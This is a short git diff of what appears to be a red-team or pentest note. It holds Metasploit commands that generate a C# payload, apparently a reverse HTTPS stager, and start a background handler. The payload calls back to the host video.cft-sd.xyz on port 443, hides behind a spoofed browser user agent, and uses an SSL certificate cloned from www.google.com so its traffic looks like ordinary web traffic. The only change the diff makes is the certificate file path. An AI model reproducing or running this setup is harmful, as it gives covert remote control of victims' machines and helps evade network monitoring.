@@ -29,7 +29,7 @@ set LPORT 443
 set HttpUserAgent "Mozilla/5.0 (X11; Windows x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
 set LURI /rest/api
 set stagerverifysslcert true
-set HANDLERSSLCERT /media/sf_Pentest/20181213120429_default_74.125.131.106_www.google.com_p_105411.pem
+set HANDLERSSLCERT /root/.msf4/loot/20181213121009_default_74.125.131.99_www.google.com_p_521262.pem
 set EXITFUNC thread
 generate -t csharp
 ```
@@ -41,7 +41,7 @@ set LHOST video.cft-sd.xyz
 set LPORT 443
 set LURI /rest/api
 set stagerverifysslcert true
-set HANDLERSSLCERT /media/sf_Pentest/20181213120429_default_74.125.131.106_www.google.com_p_105411.pem
+set HANDLERSSLCERT /root/.msf4/loot/20181213121009_default_74.125.131.99_www.google.com_p_521262.pem
 set EXITFUNC thread
 set ExitOnSession false
 exploit -j -z
